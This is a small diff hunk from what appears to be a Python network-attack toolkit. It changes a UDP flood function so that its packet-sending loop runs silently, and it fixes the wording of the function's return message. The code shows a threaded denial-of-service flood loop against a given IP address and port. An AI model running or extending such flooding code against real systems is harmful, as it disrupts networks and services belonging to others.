@@ -236,7 +236,7 @@ def perform_udp_flood_attack(ip_addr=None, port=None):
 
     def send_packet():
         while not stop_flag.is_set():
-            send(packet)
+            send(packet, verbose=0)
 
     # Create a separate thread to perform the attack
     attack_thread = threading.Thread(target=send_packet)
@@ -253,7 +253,7 @@ def perform_udp_flood_attack(ip_addr=None, port=None):
     # Wait for the attack thread to finish
     attack_thread.join()
 
-    return "UDP flood attack performed on " + ip_addr + " from " + port
+    return "UDP flood attack performed on " + ip_addr + " to port " + port
 
 
 #(14) Code to perform drop communication
